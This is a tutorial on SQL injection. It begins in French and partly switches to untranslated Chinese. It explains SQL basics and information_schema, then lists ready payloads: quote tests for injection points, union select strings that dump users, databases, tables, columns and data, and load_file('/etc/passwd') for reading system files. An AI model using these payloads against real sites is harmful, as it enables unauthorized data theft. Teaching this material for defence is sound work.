## I. Aperçu de l'injection SQL

1) L'injection SQL est une méthode d'attaque de réseau qui permet d'ajouter des instructions SQL malveillantes dans les chaînes d'entrée de l'utilisateur afin d'exécuter des commandes non planifiées ou d'accéder à des données non autorisées.
2. l'injection SQL est causée par le manque d'attention portée à la standardisation de l'écriture des instructions SQL et au filtrage des caractères spéciaux pendant le développement d'une application, ce qui fait que l'instruction SQL dans la chaîne saisie par l'utilisateur est prise par le serveur de base de données pour une instruction SQL normale et exécutée. l'injection SQL peut également être causée par l'utilisation de l'épissage de chaîne pour construire l'instruction SQL sans utiliser de requête paramétrée.

## II. syntaxe des opérations de base du langage SQL

1) L'apprentissage de l'injection SQL nécessite une certaine connaissance du langage SQL, une compréhension des instructions et fonctions SQL courantes, ainsi que de la structure et du fonctionnement de la base de données. 
2) **_Enoncés SQL couramment utilisés_** Il y a les suivants : 
   - Requête : l'instruction SELECT permet de sélectionner des données dans une table. Vous pouvez spécifier le nom des colonnes, les conditions, le tri, etc. pour effectuer la requête. Exemple :
```sql
SELECT * FROM person WHERE age > 18 ORDER BY name;
```

   - ADD : Utilisez l'instruction INSERT INTO pour insérer de nouvelles lignes dans un tableau en spécifiant les noms et les valeurs des colonnes à insérer. Exemple :
```sql
INSERT INTO person (id, name, age, gender) VALUES (1, 'sam', 20, 'Male');
```

   - Supprimer : l'instruction DELETE permet de supprimer des lignes d'un tableau et de spécifier les conditions de suppression des lignes. Vous pouvez spécifier les conditions dans lesquelles les lignes doivent être supprimées.
```sql
DELETE FROM person WHERE id = 1;
```

    - Modifier : Utilisez l'instruction UPDATE pour modifier les données d'une table. Vous pouvez spécifier les noms et les valeurs des colonnes à modifier ainsi que les conditions de la modification. Exemple :
```sql
UPDATE person SET age = 21 WHERE id = 1;
```

3) Les fonctions SQL couramment utilisées sont des types suivants : 
   - Fonctions numériques : utilisées pour calculer ou convertir des valeurs numériques, telles que ABS, ROUND, FLOOR, CEIL, POWER, SQRT, SIN, COS, LOG, etc.
   - Fonctions de chaîne : utilisées pour opérer sur des chaînes ou des traitements, telles que CONCAT, SUBSTRING, LENGTH, REPLACE, TRIM, UPPER, LOWER, REVERSE, etc.
   - Fonctions de date et d'heure : utilisées pour formater ou calculer la date et l'heure, telles que CURDATE, CURTIME, NOW, DATE_FORMAT, DATE_ADD, DATE_SUB, DATEDIFF, TIMEDIFF, etc.
   - Fonction d'agrégation : utilisée pour un groupe de valeurs à des fins statistiques ou analytiques, comme SUM, AVG, MIN, MAX, COUNT, DISTINCT, GROUP_CONCAT, etc.
   - Fonctions de fenêtre : utilisées pour trier ou calculer les données après le regroupement, telles que ROW_NUMBER, RANK, DENSE_RANK, NTILE, LAG, LEAD, FIRST_VALUE, LAST_VALUE, etc.
   - 
4. **_MySQL's information_schema_**. information_schema est une base de données MySQL spéciale qui fournit des métadonnées sur le serveur MySQL, telles que les noms des bases de données ou des tables, les types de données des colonnes ou les droits d'accès. Ces informations sont parfois appelées dictionnaire de données ou catalogue système. Vous pouvez utiliser des instructions SQL standard pour interroger les tables de l'information_schema afin d'obtenir des informations sur les métadonnées. En injection SQL, vous pouvez généralement utiliser cette bibliothèque pour interroger des données dans d'autres bibliothèques 
```sql
SELECT TABLE_NAME, TABLE_TYPE
FROM information_schema.TABLES;
```
 

## III. fonctions et déclarations couramment utilisées dans les injections SQL

1. **_Fonctions couramment utilisées dans l'injection SQL_** L'injection SQL est une technique d'attaque qui tire parti de vulnérabilités dans les instructions SQL pour envoyer des commandes SQL malveillantes à une base de données afin d'obtenir des informations sensibles ou d'effectuer des opérations illégales.Les fonctions couramment utilisées dans l'injection SQL sont les suivantes : 
   - database() : cette fonction affiche le nom de la bibliothèque de base de données actuellement utilisée. Exemple :
```sql
SELECT database();
```

   - substring() : cette fonction extrait le contenu d'un champ à partir du champ spécifié. Exemple : cette fonction extrait le contenu d'un champ à partir du champ spécifié :
```sql
SELECT substring('hello', 1, 2); -- cela donne 'he'
SELECT substring(name, 1, 2) FROM person; -- cela retourne les deux premiers caractères de la colonne name dans la table person
```

   - length() : cette fonction permet d'obtenir la longueur de la chaîne ou du champ spécifié. Exemple : cette fonction renvoie la longueur de la chaîne ou du champ spécifié :
```sql
SELECT length('hello'); -- cela donne 5
SELECT length(name) FROM person; -- Retourne la longueur de la colonne name dans la table person.
```

   - concat() : cette fonction concatène plusieurs chaînes ou champs. Exemple :
```sql
SELECT concat('hello', 'world'); -- cela donne'helloworld'
SELECT concat(name, age) FROM person;  -- Renvoie la jointure des colonnes name et age de la table person
```

   - group_concat () : cette fonction permet de relier un groupe de valeurs ; elle est souvent utilisée dans les requêtes de groupe. Exemple : cette fonction est souvent utilisée dans les requêtes de groupe :
```sql
SELECT gender, group_concat(name) FROM person GROUP BY gender; -- Renvoie une liste de noms(name) regroupés par sexe(gender) dans la table person.
```

   - hex() : cette fonction convertit une chaîne de caractères ou un nombre en hexadécimal. Exemple :
```sql
SELECT hex('hello'); -- cela donne  '68656C6C6F'
SELECT hex(123); -- cela donne '7B'
```

   - unhex() : cette fonction convertit un hexadécimal en chaîne de caractères ou en nombre. Exemple :
```sql
SELECT unhex('68656C6C6F'); -- cela donne 'hello'
SELECT CONVERT(UNHEX('68656C6C6F') USING utf8);  -- commande alternative

SELECT unhex('7B'); -- cela donne 123
SELECT CONV('7B', 16, 10);  -- commande alternative

16 est la base (base hexadécimale).
10 est la base cible (base décimale)
```

   - load_file() : cette fonction lit le contenu du fichier spécifié. Exemple : cette fonction lit le contenu du fichier spécifié :
```sql
SELECT load_file('/etc/passwd'); -- Renvoie le contenu du fichier /etc/passwd
```

   - user() : Cette fonction renvoie l'utilisateur utilisé pour la connexion actuelle à la base de données. Exemple :
```sql
SELECT user(); -- renvoie'root@localhost'
```

   - version() : Cette fonction renvoie la version actuelle de la base de données. Exemple :
```sql
SELECT version(); -- renvoie '8.0.26'
```

   - sleep() : cette fonction suspend la base de données pendant un certain nombre de secondes. Exemple :
```sql
SELECT sleep(5); -- Interrompre la base de données pendant 5 secondes
```

   - floor() : cette fonction renvoie le plus grand nombre entier qui n'est pas supérieur à la valeur spécifiée. Exemple : 
```sql
SELECT floor(3.14); -- renvoie 3
```

   - rand() : cette fonction permet de renvoyer un nombre aléatoire. Exemple :
```sql
SELECT rand(); -- renvoie 0.123456
```

2. **_Énoncés couramment utilisés dans les injections SQL_** 
   - Pour déterminer s'il existe un point d'injection : saisissez l'instruction suivante dans l'URL ou le formulaire pour voir si la page change. 
```sql
' and 1=1
# ou
' and 1=2
```
 

   - Deviner le nom de la table : saisissez l'instruction suivante dans l'URL ou le formulaire pour vérifier si la table admin existe. 
```sql
and 0<> (select count (*) from *)
# ou
and 0<> (select count (*) from admin)
```
 

   - Obtenir la version de la base de données : saisissez l'instruction suivante dans l'URL ou le formulaire pour voir si la version de la base de données peut être affichée. 
```sql
and 1= (select @@VERSION)
# ou
and 1= (select version())
```
 

- Obtenir le nom de la base de données : saisissez l'instruction suivante dans l'URL ou le formulaire pour voir si le nom de la base de données peut être affiché.
```sql
and 1= (select db_name ())
#ou
and 1= (select database())
```
 

   - Obtenir le nom de la table : saisissez l'instruction suivante dans l'URL ou le formulaire pour voir si le nom de la table peut être affiché. 
```sql
and 1= (select top 1 name from sysobjects where xtype='U')
#ou
and 1= (select table_name from information_schema.tables limit 1)
```
 

   - Obtenir le nom de la colonne : saisissez l'instruction suivante dans l'URL ou le formulaire pour voir si le nom de la colonne peut être affiché. 
```sql
and 1= (select top 1 name from syscolumns where id=object_id('nom de la table')
# ou
and 1= (select column_name from information_schema.columns where table_name='nom de la table'limit 1)
```
 

   -  获取数据：在URL或表单中输入如下语句，看是否能显示数据。 
```sql
and 1= (select top 1 列名 from 表名)
#或
and 1= (select 列名 from 表名 limit 1)
```
 
## 四、SQL注入中的常用命令

   1.  SQL注入中的常用命令示例： 
      -  查看当前用户 
```sql
union select 1, (select user ())–+
```
 

      -  查看数据库版本 
```sql
union select 1, (select version ())–+
```
 

      -  查看当前数据库名 
```sql
union select 1, (select database ())–+
```
 

      -  查看所有数据库名 
```sql
union select 1, (select group_concat (schema_name) from information_schema.schemata)–+
```
 

      -  查看某个数据库的所有表名 
```sql
union select 1, (select group_concat (table_name) from information_schema.tables where table_schema='数据库名')–+
```
 

      -  查看某个表的所有列名 
```sql
union select 1, (select group_concat (column_name) from information_schema.columns where table_name='表名')–+
```
 

      -  查看某个列的所有数据 
```sql
union select 1, (select group_concat (列名) from 表名)–+
```
 

## 五、SQL注入的类别

1. SQL注入的种类有以下几种： 
   - 联合注入：可以使用union的情况下的注入。
   - 布尔盲注：不能根据页面返回内容判断任何信息，只能根据条件真假来判断。
   - 报错注入：页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。
   - 时间盲注：不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行来判断。
   - 堆叠注入：可以同时执行多条语句的执行时的注入。
   - 二次注入：在数据库中存储了用户的输入，再次执行时触发的注入。
   - 宽字节注入：利用字符编码的差异，绕过过滤的注入。
   - Cookie注入：利用Cookie中的参数进行注入

## 六、SQL注入常用的检测方法

1. SQL注入常用的检测方法有以下几种： 
   - 动态检测：通过向数据库发送特殊的SQL语句，观察数据库的响应，判断是否存在SQL注入漏洞。
   - 静态检测：通过分析程序源代码，找出可能存在SQL注入风险的语句，进行修复或优化。
   - 插入单、双引号：通过在参数中添加单引号或双引号，看是否出现数据库错误提示，判断是否有注入点。
   - 使用SQL注入检测工具：例如SQLMap、SQLNinja、Havij等，可以自动化地发现和利用SQL注入漏洞
